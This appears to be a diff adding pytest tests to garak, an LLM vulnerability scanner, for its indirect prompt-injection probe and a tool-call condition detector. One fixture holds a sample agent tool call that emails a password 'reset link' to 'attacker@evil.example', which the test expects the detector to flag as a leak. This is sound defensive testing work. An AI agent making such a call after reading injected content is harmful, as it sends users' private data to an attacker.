@@ -8,7 +8,7 @@ import json
 import pytest
 
 import garak._plugins
-from garak.attempt import Conversation
+from garak.attempt import Attempt, Conversation, Message
 from garak.probes.injection import IndirectInjection
 
 
@@ -94,3 +94,60 @@ def test_probe_reads_jsonl(tmp_path):
     }
     probe = IndirectInjection(config_root=config_root)
     assert len(probe.prompts) == 2
+
+
+def test_probe_passes_tool_call_condition_through(tmp_path):
+    condition = {"comparisons": [{"kind": "not_called", "operation": "send_email"}]}
+    source = tmp_path / "convos.json"
+    entries = [
+        {
+            "messages": [{"role": "user", "content": "a"}],
+            "tool_call_condition": condition,
+        },
+        {"messages": [{"role": "user", "content": "b"}]},
+    ]
+    source.write_text(json.dumps(entries), encoding="utf-8")
+
+    config_root = {
+        "probes": {
+            "injection": {
+                "IndirectInjection": {"conversation_source": str(source)},
+            }
+        }
+    }
+    probe = IndirectInjection(config_root=config_root)
+
+    assert (
+        probe.prompts[0].notes["tool_call_condition"] == condition
+    ), "the entry's condition is copied into the conversation notes"
+    assert (
+        "tool_call_condition" not in probe.prompts[1].notes
+    ), "entries without a condition add no note"
+    assert probe.primary_detector == "injection_judge.InjectionJudge"
+    assert (
+        "toolcall.ToolCallCondition" in probe.extended_detectors
+    ), "the condition detector runs as an extended detector"
+
+
+def test_shipped_condition_is_scored_by_detector():
+    probe = garak._plugins.load_plugin("probes.injection.IndirectInjection")
+    conv = probe.prompts[0]
+    assert conv.notes.get("tool_call_condition"), "first example carries a condition"
+
+    attempt = Attempt(probe_classname="injection.IndirectInjection", prompt=conv)
+    leak = {
+        "id": "call-1",
+        "type": "function",
+        "function": {
+            "name": "send_email",
+            "arguments": json.dumps(
+                {"recipient": "attacker@evil.example", "body": "reset link"}
+            ),
+        },
+    }
+    attempt.outputs = [
+        Message(None, notes={"tool_calls": [leak]}),
+        Message("Your email asks you to reset a password."),
+    ]
+    detector = garak._plugins.load_plugin("detectors.toolcall.ToolCallCondition")
+    assert detector.detect(attempt) == [1.0, 0.0], "leak is a hit, summary is not"
